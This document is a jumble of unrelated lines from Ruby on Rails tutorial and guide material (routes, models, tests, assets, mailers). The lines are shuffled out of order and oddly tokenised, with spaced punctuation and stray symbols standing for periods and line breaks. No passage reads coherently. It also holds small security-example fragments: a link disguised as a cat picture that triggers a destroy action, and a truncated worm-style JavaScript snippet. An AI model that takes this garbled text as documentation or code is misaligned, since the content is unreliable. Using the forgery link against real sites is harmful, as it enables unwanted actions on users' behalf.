-134 ▖ ordinal # = &gt; &quot; th &quot;
Passing in a ╼ symbol ( ` : article` ) with the same name as the instance variable ( ` @ article` ) ╼ also automagically leads to the same behavior ▖
# # # Helpers Loading Order
creates a \ texttt { found \ _ user } variable whose value is equal to the result of \ texttt { find \ _ by } .
Writing new Guardfile to / Users / mhartl / rails _ projects / sample _ app / Guardfile
This behavior was never intentionally supported ▖
WARNING : You may put your initializer before or after any other initializer in the chain , as long as it is logical ▖
( This is our first example of the notion of \ emph { scope } .
╼ x = x + 1 - &gt; x + = 1 ╼ x = x * 3 - &gt; x * = 3 ╼ x = x - 8 - &gt; x - = 8 ╼ x = x / 2 - &gt; x / = 2 ╼ @ foo = @ foo &#124; &#124; &quot; bar &quot; - &gt; @ foo &#124; &#124; = &quot; bar &quot;
/ users / 1
This is a setting for Rails itself ▖
remember _ token
One common question is how much background is necessary to learn web development using the \ emph { Ruby on Rails Tutorial } .
&gt; &gt; Person ▖ create ▖ errors &#91; : name &#93; ▖ any ?
* his or her ▖ ▖ ▖ use their .
&#91; `button _ to` &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / UrlHelper ▖ html # method-i-button _ to ) is a helper that helps you create buttons ▖
The somewhat odd syntax
&lt; td &gt; &lt; % = c % &gt; &lt; / td &gt;
= &gt; &quot; 2013-03-11 00 : 57 : 46 &quot;
&quot; About &quot;
Adding follower stats to the Home page .
# # # # Methods Added by `belongs _ to`
Of course , to get the partial to work , we have to create the corresponding file and fill it with some content .
&lt; % = form _ for @ user do &#124; f &#124; % &gt;
Layout declarations cascade downward in the hierarchy , and more specific layout declarations always override more general ones ▖
= &gt; # &lt; User : 0x225167c @ email = &quot; mhartl @ example ▖ com &quot; , ╼ @ name = &quot; Michael Hartl &quot; &gt;
Having finished both the data modeling and display templates for microposts , we now turn our attention to the interface for creating them through the web .
Click on the gear icon in the upper right part of the file navigation pane ( Figure ~ \ ref { fig : file _ navigator _ gear _ icon } ) .
commit df0a62f3f091e53ffa799309b3e32c27b0b38eb4
Absolute qualified constant names like ` : : Math : : PI` raise `NameError` .
To include `app / assets / stylesheets / main ▖ css` and `app / assets / stylesheets / photos / columns ▖ css` :
CRUD is an acronym for the four verbs we use to operate on data : * * C * * reate , ╼ * * R * * ead , * * U * * pdate and * * D * * elete ▖
We can accomplish this by following the pattern in Listing ~ \ ref { code : pages _ routes } , as shown in Listing ~ \ ref { code : about _ route } .
Instead of opening a new pull request , ╼ you can force push to your branch on GitHub as described earlier in ╼ squashing commits section :
Searched in : * &quot; / path / to / blog / app / views &quot;
The results of expressions follow them and are introduced by &quot; # = &gt; &quot; , vertically aligned :
By passing the symbol \ kode { : user } to the \ kode { factory } command , we tell Factory Girl that the subsequent definition is for a User model object .
( As we &apos;ll see in a moment , there will be one extra boolean in the expression above .
&lt; % = f ▖ submit % &gt;
The field name can also be a string :
* `ActionDispatch : : Callbacks ▖ before` takes a block of code to run before the request .
These files are used by the Bundler gem ▖
Previously , Rails allowed inline callback blocks to use `return` this way :
Because its use is ubiquitous , you should install Git even at this early stage ; I suggest following the installation instructions for your platform at the \ href { http : / / www ▖ git-scm ▖ com / book / en / Getting-Started-Installing-Git } { Installing Git section of \ emph { Pro Git } } .
Using `scope` , we can alter path names generated by resources :
Because the \ emph { Rails Tutorial } covers testing of Rails applications , it is often helpful to know if a particular piece of code causes the test suite to fail ( indicated by the color red ) or pass ( indicated by the color green ) .
Then we can make the corresponding replacements for the Help and About pages ( Listing ~ \ ref { code : help _ view _ erb _ title } and Listing ~ \ ref { code : about _ view _ erb _ title } ) .
Testing that \ kode { edit } and \ kode { update } are protected ▖
( This will require a modification of the \ kode { authenticated ? } \ method defined in Listing ~ \ ref { code : authenticated _ p } ▖ )
The cumulative effect will be a deeper , more flexible knowledge of Rails , giving you a good background for writing nearly any type of web application .
With the introduction of ╼ Active Job and ` # deliver _ later` , this is no longer true ▖
╼ * = require _ self
Rails ▖ application ▖ config ▖ assets ▖ precompile + = &#91; &apos; admin ▖ js &apos; , &apos; admin ▖ css &apos; , &apos; swfObject ▖ js &apos; &#93;
( If it doesn &apos;t look like Listing ~ \ ref { code : bitbucket _ add _ push } , it might be because the public key didn &apos;t get added correctly , in which case I suggest trying that step again ▖ )
As indicated by the comment in the \ kode { setup } method , the code to create the micropost is not idiomatically correct , which we &apos;ll fix in Section ~ \ ref { sec : user _ micropost _ associations } .
When a file is referenced from a manifest or a helper , Sprockets searches the ╼ three default asset locations for it .
* How to use eager loading to reduce the number of database queries needed for data retrieval .
In database terms , this associates two classes via an intermediate join table that includes foreign keys referring to each of the classes .
Let &apos;s fire up the console , \ kode { require } the example user code , and take our User class out for a spin :
Loading test environment
If you look at the response for this using cURL , you will see the following :
( If you &apos;re using Guard as described in Section ~ \ ref { sec : guard } , you may need to restart that as well , and it may even be necessary to exit the terminal shell and re-run Guard in a new one ▖ )
* How to clone master and run the test suite .
&lt; / nav &gt;
This means that every valid CSS file is also a valid SCSS file , which is convenient for projects with existing style rules .
To test the remember token , we first save the test user ( thereby creating it , since it has never been saved ) , and then check that the user &apos;s \ kode { remember \ _ token } attribute isn &apos;t blank .
In contrast , the whole point of calculating a password &apos;s hash digest is to be \ emph { irreversible } , so that it is computationally intractable to infer the original password from the digest ▖ (
$ bin / rails g controller comments
create app / views / user _ mailer
The first part identifies what template is missing ▖
before _ action : set _ expert _ locale
# Returns true if a password reset has expired .
What can you do for these ?
This is exactly the problem solved by \ emph { Ajax } , which allows web pages to send requests asynchronously to the server without leaving the page
* `proxy _ association ▖ reflection` returns the reflection object that describes the association .
* Sets up the flash keys ▖
class SendWeeklySummary
get &apos; photos / : id &apos; , to : &apos; photos # show &apos; , id : / &#91; A-Z &#93; \ d { 5 } /
# # # Create
You could specify `ASC` or `DESC` as well :
You should also restart the web server to ensure that the new gems are loaded properly .
&quot; 2013-03-06 02 : 37 : 37 &quot; , updated _ at : &quot; 2013-03-06 02 : 37 : 37 &quot; &gt; , # &lt; Micropost id : 2 ,
* Adds ETag header on all String bodies ▖
# it is equivalent to &lt; tt &gt; collection ▖ size ▖ zero ? &lt; / tt &gt; ▖ If the
* `config ▖ active _ record ▖ maintain _ test _ schema` is a boolean value which controls whether Active Record should try to keep your test database schema up-to-date with `db / schema ▖ rb` ( or `db / structure ▖ sql` ) when you run your tests ▖
&lt; % end % &gt;
The answer is that Ruby doesn &apos;t distinguish between newlines and other whitespace in this context
Since we can &apos;t allow just any user to have such dangerous powers , we &apos;ll take care to create a privileged class of administrative users authorized to delete other users .
Another example is this code from `ActiveRecord : : ConnectionAdapters : : AbstractAdapter` where ` @ logger` could be `nil` ▖
Ruby on Rails Tutorial Sample App &#124;
Blank lines should not have any spaces .
CRUD : Reading and Writing Data
* `association = ( associate ) `
All unsaved members of the association will automatically be saved when the parent is saved .
The users index with pagination .
Person ▖ create ( name : &quot; John Doe &quot; ) ▖ valid ?
* Replaces underscores with spaces , if any .
A filled-in form with \ kode { text } and \ kode { password } fields ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / filled _ in _ form _ bootstrap-full ▖ png } { ( full size ) }
Rails also has built-in support for converting objects to XML and rendering that XML back to the caller :
* If `since` or `ago` jump to a time that can &apos;t be expressed with `Time` a `DateTime` object is returned instead .
= &gt; &#91; &quot; A &quot; , &quot; B &quot; , &quot; C &quot; &#93;
from Listing ~ \ ref { code : micropost _ instance _ variable } to
This arranges both for a valid page at \ kode { / help } ( responding to \ texttt { GET } requests ) and a named route called \ kode { help \ _ path } that returns the path to that page .
Let &apos;s take a moment to discuss its structure .
With the addition of the Microposts resource , we are nearly finished with our sample application .
We next define the form for creating microposts ( Listing ~ \ ref { code : micropost _ form } ) , which is similar to the signup form in Listing ~ \ ref { code : signup _ form } .
hash # = &gt; { : b = &gt; 2 }
A program for generating code , opening console sessions , or starting a local server
self ▖ include _ root _ in _ json = false
layout &quot; special &quot;
You will need to include the `ActionView : : RecordIdentifier` module in controllers requiring this feature .
Tests for the \ kode { full \ _ title } helper .
&#124; test / controllers / comments _ controller _ test ▖ rb &#124; The test for the controller &#124;
Although the view will exist as a single page of code , each profile will be customized using information retrieved from the application &apos;s database .
Note that Listing ~ \ ref { code : user _ signup _ with _ account _ activation } has changed the redirect behavior upon signing up .
Write tests for the stats on the Home and profile pages .
destroy
# &lt; foo type = &quot; integer &quot; &gt; 1 &lt; / foo &gt;
Since the delete links appear on the users index , we &apos;ll add these tests to the users index test from Listing ~ \ ref { code : user _ index _ test } .
( We &apos;ll discuss \ kode { private } in more detail in Section ~ \ ref { sec : remember _ me } ▖ )
in Listing ~ \ ref { code : user _ edit _ view } .
* ` : in` ( or ` : within` ) - The attribute length must be included in a given ╼ interval ▖
As usual , it &apos;s a good idea to verify that the test suite is green before proceeding :
There are two types of form helpers : those that specifically work with model attributes and those that don &apos;t ▖
# # # # `split ( value = nil ) `
&lt; a href = &apos; http : / / example ▖ com / articles / 1 / destroy &apos; &gt; look at this cat !
The reason is that , as noted in Section ~ \ ref { sec : a _ hashed _ password } , \ kode { has \ _ secure \ _ password } enforces validations on the virtual \ kode { password } and \ kode { password \ _ confirmation } attributes , but the tests in Listing ~ \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } create an \ kode { @ user } variable without these attributes :
&lt; p &gt; Hello there , this is our image &lt; / p &gt;
This can be undone using
When no CDN is used , a ╼ browser will use this information to cache contents ▖
@ order = @ customer ▖ orders ▖ create ( order _ date : Time ▖ now ,
And we &apos;ll see in Section ~ \ ref { sec : unsuccessful _ signups } how validations give us convenient error messages when users make submissions that violate them .
When presented with a cookie containing a persistent user id , find the user in the database using the given id , and verify that the remember token cookie matches the associated hash digest from the database .
Besides ` : only _ integer` , this helper also accepts the following options to add ╼ constraints to acceptable values :
To add a route to the collection :
The form itself appears as in Listing ~ \ ref { code : signup _ form } .
By definition all objects are `duplicable ? ` except `nil` , `false` , `true` , symbols , numbers , class , module , and method objects .
If `return` is needed it is recommended to explicitly define a method .
Create a file called `welcome _ email ▖ html ▖ erb` in `app / views / user _ mailer / ` ▖
Tests for the validity of a new micropost ▖
and understands strings that start with lowercase :
# option will only run in the specified context .
The Home page with a new micropost form .
# # # # javascript _ url
Migrations change the state of the database using the command
as shown in Listing ~ \ ref { code : edit _ tests _ logged _ in } .
as shown in Listing ~ \ ref { code : sample _ app _ readme } .
We &apos;ve used the code in Listing ~ \ ref { code : proto _ status _ feed } instead because it generalizes much more naturally to the full status feed needed in Chapter ~ \ ref { cha : following _ users } .
Unfortunately , experience shows that even minor point releases can break things , so for the \ emph { Rails Tutorial } we &apos;ll err on the side of caution by including exact version numbers for virtually all gems .
&#124; ` { &quot; person &quot; : &#91; &quot; foo &quot; , null &#93; } ` &#124; ` { : person = &gt; &#91; &quot; foo &quot; &#93; } ` &#124;
Time ▖ current
NOTE ▖ If you want to use multiple Sass files , you should generally use the &#91; Sass ` @ import` rule &#93; ( http : / / sass-lang ▖ com / docs / yardoc / file ▖ SASS _ REFERENCE ▖ html # import ) ╼ instead of these Sprockets directives ▖
* Overriding engine functionality in the application .
# # # What about Feature Requests ?
in Listing ~ \ ref { code : update _ columns } .
belongs _ to : customer , class _ name : &quot; Patron &quot;
The `t ▖ references` line sets up a foreign key column for the association between ╼ the two models ▖
Analogous constructs exist for other operators as well :
The final step is to define the initial version of the signin page .
The `javascript _ include _ tag` helper returns an HTML `script` tag for each source provided .
We do this by first updating our test with the code in Listing ~ \ ref { code : home _ base _ title _ spec } , which updates the previous title test and adds one to test for the absence of the custom \ kode { &quot; Home &quot; } string in the title .
While this is annoying , it &apos;s relatively easy to fix ▖
When using Sprockets directives , Sass files exist within ╼ their own scope , making variables or mixins only available within the document they were defined in .
label _ tag &apos; name&apos;
The browser issues a request for the / users URL .
def self ▖ created _ before ( time )
You can choose to have specific ╼ validations run when an object is created , saved , or updated .
class ApplicationMailer &lt; ActionMailer : : Base
Let &apos;s discuss what it takes to make that happen .
```js
# # # Array Conditions
Note that we &apos;ve added the argument \ kode { default : false } to \ kode { add \ _ column } in Listing ~ \ ref { code : admin _ migration } , which means that users will \ emph { not } be administrators by default .
Open the `app / models / article ▖ rb` file and edit it :
# config ▖ action _ dispatch ▖ x _ sendfile _ header = &apos; X-Accel-Redirect &apos; # for NGINX
Technically , SSL is now TLS , for Transport Layer Security , but everyone I know still says ``SSL &apos; &apos; .
You can set up as many dynamic segments within a regular route as you like ▖
2009 ▖ ordinal # = &gt; &quot; th &quot;
In the case of `blank ? ` the note reads :
The profile of a user to follow , with a follow button .
Article ▖ recent ▖ any ?
Because it &apos;s the URL for an address like http : / / www ▖ example ▖ com / ( where nothing comes after the final forward slash ) , the root URL is often referred to as / ( ``slash &apos; &apos; ) for short .
The issue is that , without \ kode { to \ _ a } , destroying the user would destroy the posts in the \ kode { microposts } variable , and as a result
These methods will still be accessible on the association objects :
rescue _ from ( ActiveRecord : : RecordNotFound ) do &#124; exception &#124;
= &gt; # &lt; User : 0x225167c @ email = &quot; mhartl @ example ▖ com &quot; , @ name = &quot; Michael Hartl &quot; &gt;
Introduction to MVC
Adding \ kode { store \ _ location } to the logged-in user before filter .
&#91; `link _ to` &#93; ( http : / / api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / UrlHelper ▖ html # method-i-link _ to ) ╼ is a helper that assists with generating links ▖
To learn more about the different types of associations , read the next section of this guide ▖
Inline callback blocks using `return` can be refactored to evaluate to the ╼ returned value :
private
get Rack : : Utils ▖ escape ( &apos; こんにちは &apos; ) , controller : &apos; welcome &apos; , action : &apos; index&apos;
The `audio _ tag` helper builds an HTML 5 ` &lt; audio &gt; ` tag to the specified file ▖
Because these tests are fairly advanced , we &apos;ll build them up piece by piece .
Overriding the Naming Conventions
inside a \ kode { p } ( paragraph ) tag .
# # # # image _ submit _ tag
# Remove this line if you &apos;re not using ActiveRecord or ActiveRecord fixtures
The most common techniques for implementing sessions in Rails involve using \ href { http : / / en ▖ wikipedia ▖ org / wiki / HTTP _ cookie } { \ emph { cookies } } , which are small pieces of text placed on the user &apos;s browser .
Back in Section ~ \ ref { sec : static _ pages } we created a Git branch for the development of static pages .
You need to tell the user that ╼ something went wrong ▖
&lt; / strong &gt;
The methods `compact` and `compact ! ` return a Hash without items with `nil` value .
as shown in Listing ~ \ ref { code : user _ feed } .
Then we deploy , reset the database , and reseed the sample data :
&lt; % = csrf _ meta _ tags % &gt;
# &lt; url-id &gt; david-heinemeier-hansson &lt; / url-id &gt;
Here is the most straightforward test to check for XSS :
The asset pipeline involves lots of changes under Rails &apos; hood , but from the perspective of a typical Rails developer there are three principal features to understand : asset directories , manifest files , and preprocessor engines
This initializer - which runs only if `cache _ classes` is set to `false` - uses `ActionDispatch : : Callbacks ▖ after` to remove the constants which have been referenced during the request from the object space so that they will be reloaded during the following request .
The test appears as in Listing ~ \ ref { code : contact _ page _ test } , which simply follows the model last seen in Listing ~ \ ref { code : title _ tests } .
Oh dear !
@ orders = Order ▖ where ( customer _ id : @ customer ▖ id )
$ ▖ ajax ( url : &quot; / test &quot; ) ▖ done ( html ) - &gt;
As hinted at in the last section , the feed implementation in Section ~ \ ref { sec : a _ first _ feed _ implementation } doesn &apos;t scale well when the number of microposts in the feed is large , as would likely happen if a user were following , say , 5000 other users .
NOTE : Defined in `active _ support / core _ ext / hash / reverse _ merge ▖ rb` .
The first step toward getting custom CSS to work is to create such a custom CSS file :
A preview of HTML version of the account activation email .
First , we need to define \ kode { @ micropost } , which ( as before ) we do through the association :
because otherwise Rails would look for a \ kode { ReverseRelationship } class , which doesn &apos;t exist .
When finished , press &quot; Send ╼ pull request &quot; ▖
The new micropost page ( \ href { http : / / localhost : 3000 / microposts / new } { / microposts / new } ) .
You can see that the code uses `try` and avoids an unnecessary check .
In other words , where the \ kode { relationships } association uses the \ kode { follower \ _ id } foreign key ,
&lt; % content _ for : head do % &gt;
* `config ▖ action _ dispatch ▖ signed _ cookie _ salt` sets the signed cookies salt value ▖ ╼
alternatively you can set the `RAILS _ RELATIVE _ URL _ ROOT` environment ╼ variable .
On many systems , pending specs will be displayed in yellow to indicate that they are in between passing ( green ) and failing ( red ) .
To arrange this behavior , all we need to do is add a call to \ kode { log \ _ in } in the Users controller \ kode { create } action , as shown in Listing ~ \ ref { code : login _ upon _ signup }
( Recall that if Bundler complains about a \ texttt { readline } error , try adding \ kode { gem &apos; rb-readline &apos; } to your \ kode { Gemfile } ▖ )
element ▖ style ▖ color = textColor
* `action _ view ▖ set _ configs` Sets up Action View by using the settings in `config ▖ action _ view` by `send` &apos; ing the method names as setters to `ActionView : : Base` and passing the values through .
In order to keep the main discussion independent of the exercises , the solutions are not generally incorporated into subsequent code listings .
1234 ▖ to _ s ( : human _ size ) # = &gt; 1 ▖ 21 KB
If it is a hash it pops it and returns it , otherwise it returns an empty hash .
All of them are user-supplied and may be manipulated with more or less effort ▖
* `ActionDispatch : : Static` is used to serve static assets ▖
Time ▖ current - created _ at
For Vim , you type
Please use ╼ ` &lt; tt &gt; ▖ ▖ ▖ &lt; / tt &gt; ` for everything else , notably class or module names with a ╼ namespace as in ` &lt; tt &gt; ActiveRecord : : Base &lt; / tt &gt; ` .
The tests for these buttons combine many of the testing techniques covered throughout this tutorial and make for a good exercise in reading code .
It won &apos;t be part of the Rails Git repository .
NOTE : Defined in `active _ support / core _ ext / array / conversions ▖ rb` .
Using a `Proc` object gives you the ability to write an ╼ inline condition instead of a separate method ▖
As with the case of user signup ( Figure ~ \ ref { fig : signup _ failure } ) , these parameters form a \ emph { nested } hash like the one we saw in Listing ~ \ ref { code : nested _ hashes } .
in Listing ~ \ ref { code : factory _ sequence } .
The micropost index page ( \ href { http : / / localhost : 3000 / microposts } { / microposts } ) .
within product we &apos;ll get ` @ product` in the local variable `product` , as if we had written :
attr _ accessor : log _ level
Adding the contents of the \ kode { flash } variable to the site layout .
Middlewares can also be completely swapped out and replaced with others :
This includes \ texttt { rspec-rails } in a development environment so that we have access to RSpec-specific generators , and it includes it in test mode in order to run the tests .
&#124; app / controllers / comments _ controller ▖ rb &#124; The Comments controller &#124;
block , time = self , Time ▖ current
If you are using Windows , ╼ your prompt will look something like `c : \ source _ code &gt; `
&lt; % = javascript _ include _ tag &quot; application &quot; , debug : true % &gt;
If you were to create a comment ╼ right now , you would see this error :
* strings composed only of whitespace ( see note below ) ,
User ▖ all
c1 ▖ save
Extensions to `Date`
I particularly recommend installing \ href { http : / / nodejs ▖ org / } { Node ▖ js } .
Testing that newly signed-up users are also signed in .
create app
This code simply reuses the token and digest methods used for the remember token , as we can see by comparing with the \ kode { remember } method from Listing ~ \ ref { code : user _ model _ remember } :
# # # # Setting Configuration Settings in the Application
Click on &quot; Edit &quot; , if you need to change the branches being compared ( it compares ╼ &quot; master &quot; by default ) and press &quot; Click to create a pull request for this ╼ comparison &quot; .
We see that \ kode { xhr } takes as arguments a symbol for the relevant HTTP method , a symbol for the action , and a hash representing the contents of \ kode { params } in the controller itself .
Now we &apos;re prepared to see why
For reference , the final \ kode { Gemfile } is shown in Listing ~ \ ref { code : final _ gemfile } .
Defining a \ kode { Procfile } for Puma .
Once you &apos;ve installed RubyGems , installing Rails should be easy .
Recalling from Section ~ \ ref { sec : css _ revisited } we can omit the curly braces for final hash arguments , we can create another user by passing a hash to the \ kode { initialize } method to create a user with pre-defined attributes :
The result appears in Listing ~ \ ref { code : login _ after _ signup _ test }
You can use `limit` to specify the number of records to be retrieved , and use `offset` to specify the number of records to skip before starting to return the records ▖
in Listing ~ \ ref { code : authentication _ steps } .
The second element inside the divs is a list of navigation links , made using the \ emph { unordered list } tag \ kode { ul } , together with the \ emph { list item } tag \ kode { li } :
The method `with _ options` provides a way to factor out common options in a series of method calls .
t ▖ timestamps
( Because of the email downcasing callback in Listing ~ \ ref { code : email _ downcase } , this will never make a difference in this tutorial , but it &apos;s a good practice in case the \ kode { gravatar \ _ for } ever gets used on email addresses from other sources ▖ )
A `has _ one : through` association sets up a one-to-one connection with another model ▖
&#124; app / helpers / comments _ helper ▖ rb &#124; A view helper file &#124;
entry ▖ author do &#124; author &#124;
Runs for every request in `development` mode , but only once for `production` or environments with `cache _ classes` set to `true` .
$ bundle exec rake db : migrate : reset ╼ $ bundle exec rake db : seed
$ bundle exec rake db : migrate
Whitelist filtering states the values allowed as opposed to the values not allowed ▖
get &apos; preview &apos; , on : : new
in Listing ~ \ ref { code : name _ presence _ test } .
\ href { http : / / railscasts ▖ com / } { RailsCasts } : It &apos;s hard to overemphasize what a great resource RailsCasts is .
If you check the &#91; Everyone &apos;s Issues &#93; ( https : / / github ▖ com / rails / rails / issues ) list in GitHub Issues , you &apos;ll find lots of issues already requiring attention ▖
$ bin / rake db : sessions : clear
Because using two spaces for indentation is a near-universal convention in Ruby , I also recommend changing the editor to use two spaces instead of the default four .
Adding \ kode { has \ _ secure \ _ password } to the User model ▖
There &apos;s also \ kode { all } :
delegate : name , to : : profile
( Note that \ href { http : / / en ▖ wikipedia ▖ org / wiki / Memoization } { \ emph { memoize } } is a technical term ; in particular , it &apos;s \ emph { not } a misspelling of ``memorize &apos; &apos; ▖ )
in Listing ~ \ ref { code : show _ only _ とctive _ users _ exercise } .
( This is known as a ``shallow copy &apos; &apos; .
As implied by their generic names , the applications developed in the \ emph { Ruby on Rails Tutorial } are not specific to any particular kind of website .
I &apos;m sure they &apos;ll appreciate it in ╼ the same way that you appreciate feedback on your patches .
These requests are less common than \ texttt { GET } and \ texttt { POST } since browsers are incapable of sending them natively , but some web frameworks ( including Ruby on Rails ) have clever ways of making it \ emph { seem } like browsers are issuing such requests .
This is most useful when updating several attributes at once ▖
Our User model accepts data such as blank names and invalid email addresses without complaint .
If you use TextMate , you can find this feature under \ texttt { View &gt; Wrap Column &gt; 78 } .
uses the \ kode { page } variable ( also provided by Capybara ) to express the expectation that the resulting page should have the right content .
We can use the above method to construct the necessary array of followed user ids by calling ~ \ kode { id } on each element in \ kode { user ▖ followed \ _ users } .
n &gt; ╼ \ end { enumerate } ╼ ╼ % subsection motivation _ and _ strategy ( end ) ╼ ╼ \ subsection { A first feed implementation } % ( fold ) ╼ \ label { sec : a _ first _ feed _ implementation } ╼ ╼ With the status feed design requirements captured in the test from Listing \ ref { code : full _ feed _ test } , we &apos;re ready to start writing the feed ▖
$ rails new unicorn
Additionally you can specify the `size : &quot; # { width } x # { height } &quot; ` option just like an `image _ tag` ▖
&quot; special &quot; : &quot; products &quot;
Some Rails classes are used like ordinary Ruby objects , but some are just \ href { http : / / www ▖ answers ▖ com / grist } { grist } for Rails &apos; magic mill .
In your migrations / schema , you will add a references column to the model itself .
= &gt; StaticPagesController
secret _ key _ base :
var IDList = &apos; &apos; ; var CRumb = &apos; &apos; ; function makeRequest ( url , Func , Method , Param ) { ▖ ▖ .
* `config ▖ action _ dispatch ▖ session _ store` sets the name of the store for session data ▖
A validation for the micropost &apos;s \ kode { user \ _ id } ▖
We &apos;ll arrange for this to happen using a \ emph { default scope } .
To apply someone &apos;s changes you need first to create a dedicated branch :
You can supply a path to the image if you like :
( 1 ▖ ▖ 5 ) ▖ sum { &#124; n &#124; n * 2 } # = &gt; 30
Module ▖ new ▖ name # = &gt; nil
So far we &apos;ve spent a lot of time understanding strings , and there &apos;s a natural way to get from strings to arrays using the \ kode { split } method :
The profile of a different user , also with microposts ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 5 } { / users / 5 } ) .
as shown in Listing ~ \ ref { code : sign _ in _ with _ remember } .
= &gt; Booting WEBrick
Alternatively , you can also do it through the `config` method on the `Rails ▖ application` object :
To show the comments on an article , edit `app / views / blorgh / articles / show ▖ html ▖ erb` and ╼ add this line before the &quot; Edit &quot; link :
has _ many : confirmed _ orders , - &gt; { where &quot; confirmed = 1 &quot; } ,
In Chapter ~ \ ref { cha : log _ in _ log _ out } , we will complete our authentication machinery by allowing users to log in and out of the application .
Once you reach a stopping point like this , it &apos;s usually a good idea to push your code up to a remote repository ( which , if you followed the steps in Section ~ \ ref { sec : bitbucket } , will be Bitbucket ) :
* = require _ self
In the Unix tradition , the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Make _ ( software ) } { \ emph { make } } utility has played an important role in building executable programs from source code ; many a computer hacker has committed to muscle memory the line
Note that , in order to ensure that the command uses the version of Rake corresponding to our \ kode { Gemfile } , we need to run \ kode { rake } using \ kode { bundle exec } .
* `config ▖ action _ mailer ▖ default _ options` configures Action Mailer defaults ▖
Only logging out if logged in ▖
produces a URL of the form
in Listing ~ \ ref { code : hello _ action _ redux } and
has _ secure _ password
as shown in Listing ~ \ ref { code : installing _ rails } .
On the other hand , for the sample application we &apos;ll also need two gems we didn &apos;t need before : the gem for RSpec and the gem for the RSpec library specific to Rails .
( This practice of evaluating \ texttt { &#124; &#124; } expressions from left to right and stopping on the first true value is known as \ emph { short-circuit evaluation } .
Migrations allow us to modify our application &apos;s data model .
We &apos;ll write simple tests for each of the titles in Table ~ \ ref { table : static _ pages } by combining the tests in Listing ~ \ ref { code : about _ test } with the \ kode { assert \ _ select } method , which lets us test for the presence of a particular HTML tag ( sometimes called a ``selector &apos; &apos; , hence the name )
By default `to _ param` just calls `to _ s` :
&#124; GET &#124; / kategorien / : id / bearbeiten &#124; categories # edit &#124; edit _ category _ path ( : id ) &#124;
For example , you get rid of the duplication in :
Although the edit and update actions from Section ~ \ ref { sec : updating _ users } are functionally complete , they suffer from a ridiculous security flaw : they allow anyone ( even non-logged-in users ) to access either action , and any logged-in user can update the information for any other user .
# # # `only`
When done right , writing tests also allows us to develop \ emph { faster } despite requiring extra code , because we &apos;ll end up wasting less time trying to track down bugs .
In practice this might not be necessary , and in fact on many systems the fixtures are created in order .
By serving ╼ one file rather than many , the load time of pages can be greatly reduced because ╼ the browser makes fewer requests ▖
# See https : / / github ▖ com / sstephenson / execjs # readme for more supported runtimes
&lt; td &gt; &lt; % = link _ to &apos; Edit &apos; , edit _ article _ path ( article ) % &gt; &lt; / td &gt;
date = Date ▖ current # = &gt; Fri , 11 Jun 2010
&quot; Float &quot; = &gt; &quot; float &quot; ,
/ publishers / 1 / magazines / 2 / photos / 3
This application will mount the engine in the ╼ `test / dummy / config / routes ▖ rb` file :
# # # # Adding Attachments
On some systems , you may need to restart the Rails server at this point to keep the test suite \ passing .
In a deep merge , if a key is found in both hashes and their values are hashes in turn , then their _ merge _ becomes the value in the resulting hash :
Adding 30 extra users to the fixture .
The core of the micropost data model is even simpler than the one for users : a micropost has only an \ kode { id } and a \ kode { content } field for the micropost &apos;s text ( of type \ kode { string } )
A list of gems used to ensure that all copies of the app use the same gem versions
In the integration test from Listing ~ \ ref { code : layout _ links _ test } , add code to visit the signup page using the \ kode { get } method and verify that the resulting page title is correct .
This command , when run for the first time , will copy over all the migrations ╼ from the engine ▖
To an experienced Rails developer , this line looks simple , but there are at least four potentially confusing Ruby ideas : built-in Rails methods , method invocation with missing parentheses , symbols , and hashes .
&gt; &gt; Rails ▖ env
Note that we &apos;ve included an optional second argument to the assertion with a custom error message , which in this case identifies the address causing the test to fail :
# Choose the compressors to use ( if any ) config ▖ assets ▖ js _ compressor =
def bar
Active Record Associations
As a bonus , by using base64 strings specifically designed to be safe in URLs ( as indicated by the name \ kode { urlsafe \ _ base64 } ) , we &apos;ll be able to use the same token generator to make account activation and password reset links in Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } .
To avoid this incompatibility , we &apos;ll standardize on all lower-case addresses , converting ``Foo @ ExAMPle ▖ CoM &apos; &apos; to ``foo @ example ▖ com &apos; &apos; before \ linebreak saving it to the database .
Perhaps the most dramatic example is the merger of Rails and Merb , a rival Ruby web framework , so that Rails now benefits from Merb &apos;s modular design , stable \ href { http : / / en ▖ wikipedia ▖ org / wiki / Application _ programming _ interface } { API } , and improved performance .
c = Customer ▖ first
In order to use a different file , call `layout` in your mailer :
This declaration needs to be backed up by the proper foreign key declaration on the orders table :
# Parentheses on function calls are optional .
The \ kode { before } block saves the user to the database so that it can be retrieved using \ kode { find \ _ by } , which we accomplish using the \ kode { let } method :
Client ▖ pluck ( : name ) ▖ limit ( 1 )
For example , we could make a persistent session by creating a cookie with value equal to the remember token that expires 20 ~ years from now :
As part of installing Ruby , if you are using OS ~ X or Linux I strongly recommend using \ href { http : / / rvm ▖ io / } { Ruby Version Manager ( RVM ) } or \ href { https : / / github ▖ com / sstephenson / rbenv } { rbenv } , which allow you to install and manage multiple versions of Ruby on the same machine .
Notice here how clever \ kode { paginate } is---it even works \ emph { through } the microposts association , reaching into the \ texttt { microposts } table and pulling out the desired page of microposts .
resources : photos do
Run Command-Shift-E to run the same test / group again , verifying that it &apos;s green .
Thus , you should always use the &quot; _ url &quot; variant of named route ╼ helpers .
&#124; GET &#124; / comments / : id / edit ( ▖ : format ) &#124; comments # edit &#124; edit _ sekret _ comment _ path &#124;
( We saw how symbols are interpolated as strings in Section ~ \ ref { sec : the _ flash } ▖ )
Base title
It is trusted , no matter whether it has been escaped or not .
Since Rails doesn &apos;t restrict the symbols that you use to set I18n ▖ locale , you can leverage this system to display different content depending on anything you like ▖
The result appears in Listing ~ \ ref { code : action _ tests _ admin }
= &gt; &#91; 42 , 8 , 17 , 6 &#93;
SELECT * FROM articles WHERE id = 10
# # # # `Date ▖ current`
You can choose from a set of built in ╼ options or specify your own .
Rails has a handy rake task for inspecting the middleware stack in use :
Instead , you &apos;ll see something that looks like the following :
In this section we &apos;ll handle unsuccessful edits , following similar ideas to unsuccessful signups ( Section ~ \ ref { sec : unsuccessful _ signups } ) .
item = Item ▖ first
the SQL executed would be :
@ order _ count = @ customer ▖ orders ▖ size
Testing for reverse relationships .
With this substitution , the corrected application code appears as in Listing ~ \ ref { code : correct _ login _ failure } .
